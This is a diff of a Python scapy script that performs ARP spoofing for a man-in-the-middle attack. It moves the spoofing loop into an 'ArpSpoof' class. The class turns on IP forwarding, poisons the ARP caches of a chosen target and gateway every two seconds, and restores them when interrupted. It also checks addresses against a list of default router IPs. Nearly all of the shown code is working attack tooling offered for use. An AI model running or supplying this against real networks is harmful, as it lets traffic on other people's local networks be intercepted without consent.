@@ -8,7 +8,7 @@ import argparse  # get values as arguments
 # function that returns MAC address of selected IP
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ether object creation, set dst MAC to broadcast MAC
     arp_request_broadcast = broadcast / arp_request  # Combine into a single packet
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # Send packets with custom Ether,
     # send packet and receive response. "timeout": Time to wait for response
@@ -39,6 +39,32 @@ def restore(dst_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)  # count: number of times to send
 
 
+class ArpSpoof:
+    def __init__(self, trg, src):
+        print("[+] Initializing Man-In-The-Middle ...")
+        self.source = src
+        self.target = trg
+
+    def run(self):
+        sent_packets_count = 0
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write("1")  # enable ip forwarding to allow flow of packets through machine
+            while True:
+                spoof(self.target, self.source)
+                spoof(self.source, self.target)
+                sent_packets_count += 2
+                print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
+                time.sleep(2)  # 2 seconds delay
+        except KeyboardInterrupt:
+            print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
+            restore(self.target, self.source)
+            restore(self.source, self.target)
+            print("[+] Done!")
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write("0")  # disable ip forwarding
+
+
 # a tuple containing all the default router gateways
 router_default = ('10.90.90.90', '192.168.0.50', '10.1.1.1', '192.168.0.3', '192.168.0.1', '192.168.1.99',
                   '192.168.10.50', '192.168.254.254', '192.168.0.10', '192.168.123.254', '10.0.0.138', '10.0.0.2',
@@ -50,27 +76,13 @@ router_default = ('10.90.90.90', '192.168.0.50', '10.1.1.1', '192.168.0.3', '192
                   '192.168.1.10', '192.168.1.20', '192.168.1.210', '192.168.10.1', '192.168.62.1', '200.200.200.5',
                   '192.168.4.1', '10.0.0.1', '192.168.1.100', '192.168.8.1', '192.168.0.30')
 scan_list = ['10.0.2.8', '10.0.2.1']
-sent_packets_count = 0
-for ip in scan_list:
-    if ip in router_default:
-        print('{}'.format(ip))
+
+for curr_ip in scan_list:
+    if curr_ip in router_default:
+        print('{}'.format(curr_ip))
     else:
         print('not in')
 target = input('Your target IP: ')
 source = input('Your source IP: ')
-try:
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-        f.write("1")  # enable ip forwarding to allow flow of packets through machine
-    while True:
-        spoof(target, source)
-        spoof(source, target)
-        sent_packets_count += 2
-        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
-        time.sleep(2)  # 2 seconds delay
-except KeyboardInterrupt:
-    print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
-    restore(target, source)
-    restore(source, target)
-    print("[+] Done!")
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-        f.write("0")  # disable ip forwarding
+arp_spoofing = ArpSpoof(target, source)
+arp_spoofing.run()
